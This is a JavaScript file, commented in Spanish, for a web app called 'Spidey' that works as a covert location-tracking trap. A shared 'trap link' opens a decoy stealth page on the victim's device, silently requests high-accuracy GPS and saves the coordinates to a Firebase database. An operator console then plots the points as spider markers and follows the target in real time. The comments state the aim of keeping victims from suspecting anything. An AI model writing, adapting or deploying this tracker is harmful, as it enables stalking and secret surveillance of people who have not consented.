import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let mainMarker;
const marcadoresAraña = L.layerGroup();
const ubicacionPorDefecto = [14.3333, -90.6667]; 

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    
    // MODO VÍCTIMA (SIGILOSO): Si la URL tiene el ?target=
    if (targetId) {
        // Ocultar la consola de Spidey para que no sospechen
        document.getElementById('main-console').style.display = 'none';
        const stealthDiv = document.getElementById('stealth-screen');
        stealthDiv.style.display = 'flex';

        // Pestañeo rápido de GPS en segundo plano
        ejecutarTrampaGPS(targetId);
        return; // Detenemos la ejecución para que no cargue el mapa en la PC de la víctima
    }

    // MODO CONSOLA PRINCIPAL (Tú en tu PC viendo el mapa normal)
    document.getElementById('main-console').style.display = 'block';
    document.getElementById('stealth-screen').style.display = 'none';

    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
    marcadoresAraña.addTo(map);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    mainMarker = L.marker(ubicacionPorDefecto, { zIndexOffset: 1000 }).addTo(map)
      .bindPopup("<b>Consola Central Activa.</b>");

    setTimeout(() => { map.invalidateSize(); }, 200);

    cargarPuntosHistoricos("objetivo_principal");
    escucharObjetivoEnTiempoReal("objetivo_principal");
});

// --- TRAPA GPS: EL PESTAÑEO INVISIBLE ---
function ejecutarTrampaGPS(id) {
    if (!navigator.geolocation) return;

    // Pide la ubicación una sola vez de forma silenciosa
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const timestamp = new Date();

            try {
                // Guarda la araña 🕷️ en el historial de Firebase
                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
                await setDoc(refHistorial, { lat, lng, timestamp });

                // Actualiza el objetivo principal
                await setDoc(doc(db, "rastreos", id), { lat, lng, timestamp });

                console.log("Señal capturada sigilosamente.");
            } catch (e) {
                console.error("Error al registrar:", e);
            }
        },
        (error) => {
            // Si rechazan el permiso, el usuario solo verá una página común y corriente sin levantar alertas
            console.log("GPS denegado por el objetivo.");
        },
        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
    );
}

// --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
async function cargarPuntosHistoricos(id) {
    marcadoresAraña.clearLayers();
    try {
        const lecturasRef = collection(db, "rastreos", id, "lecturas");
        const q = query(lecturasRef, orderBy("timestamp", "asc"));
        const querySnapshot = await getDocs(q);
        
        let ultimaUbicacion = null;

        querySnapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const spiderIcon = L.divIcon({
                html: '🕷️',
                className: 'spider-marker',
                iconSize: [24, 24],
                iconAnchor: [12, 12]
            });

            L.marker([data.lat, data.lng], { icon: spiderIcon })
                .addTo(marcadoresAraña)
                .bindPopup(`<b>Punto de Acceso 🕷️</b><br>Hora: ${data.timestamp ? data.timestamp.toDate().toLocaleTimeString() : 'Reciente'}`);
            
            ultimaUbicacion = [data.lat, data.lng];
        });

        if (ultimaUbicacion) {
            map.fitBounds(marcadoresAraña.getBounds().pad(0.1));
            document.getElementById('banner-status').innerHTML = "RED DE ARAÑAS ACTIVA";
        }
    } catch (e) {
        console.error(e);
    }
}

function escucharObjetivoEnTiempoReal(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            mainMarker.setLatLng([data.lat, data.lng]);
        }
    });
}

// Botones de utilidad de tu consola
window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace trampa copiado con éxito!");
    });
};

window.obtenerUbicacionActual = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 16);
    });
};

window.centrarEnMiUbicacion = () => {
    navigator.geolocation?.getCurrentPosition((pos) => {
        map.setView([pos.coords.latitude, pos.coords.longitude], 17);
    });
};

window.accionRastrearObjetivo = () => alert("Modo sigiloso armado en el enlace.");
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Chat abierto.");
window.verArchivo = () => alert("Abriendo archivos...");
